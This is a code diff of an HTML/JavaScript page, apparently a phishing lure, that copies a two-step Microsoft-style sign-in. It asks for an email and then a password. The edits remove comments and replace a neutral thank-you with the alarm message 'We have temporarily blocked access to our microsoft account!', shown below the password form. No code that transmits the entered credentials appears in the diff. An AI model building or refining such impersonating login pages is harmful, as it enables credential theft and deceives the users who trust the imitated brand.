@@ -63,7 +63,6 @@
       text-decoration: none;
     }
 
-    /* Add spacing between links and next button */
     .spacer {
       margin-bottom: 20px;
     }
@@ -100,11 +99,8 @@
       <h2>Sign in</h2>
       <input type="email" id="email" class="input-field" placeholder="Email or phone" />
       
-      <!-- Links above the "Next" button -->
       <a href="#" class="link">No account? <strong>Create one!</strong></a>
       <a href="#" class="link">Can’t access your account?</a>
-
-      <!-- Spacer to add space between the links and button -->
       <div class="spacer"></div>
 
       <button class="btn" onclick="goToStep2()">Next</button>
@@ -113,17 +109,16 @@
     <!-- Step 2: Password Form -->
     <div id="step2" class="hidden">
       <img src="menu.png" alt="Logo" class="logo" />
-      <!-- Email Display -->
       <div class="email-display" id="displayEmail">example@email.com</div>
       <h2>Enter your password</h2>
       <input type="password" id="password" class="input-field" placeholder="Password" />
       <button class="btn" onclick="submitForm()">Next</button>
       <a href="#" class="link" id="sendCodeLink">Send a code</a>
-    </div>
 
-    <!-- Success Message -->
-    <div id="successMessage" class="hidden">
-      <p class="message">Thanks for signing in!</p>
+      <!-- Success Message BELOW password -->
+      <div id="successMessage" class="message hidden">
+        We have temporarily blocked access to our microsoft account!
+      </div>
     </div>
   </div>
 
@@ -134,11 +129,9 @@
         alert("Please enter your email.");
         return;
       }
-      // Display email in second step
+
       document.getElementById("displayEmail").innerText = email;
       document.getElementById("sendCodeLink").innerText = `Send a code to ${email}`;
-
-      // Toggle visibility
       document.getElementById("step1").classList.add("hidden");
       document.getElementById("step2").classList.remove("hidden");
     }
@@ -150,8 +143,7 @@
         return;
       }
 
-      // Hide the password form and show the success message
-      document.getElementById("step2").classList.add("hidden");
+      // Show the success message BELOW the password form
       document.getElementById("successMessage").classList.remove("hidden");
     }
   </script>
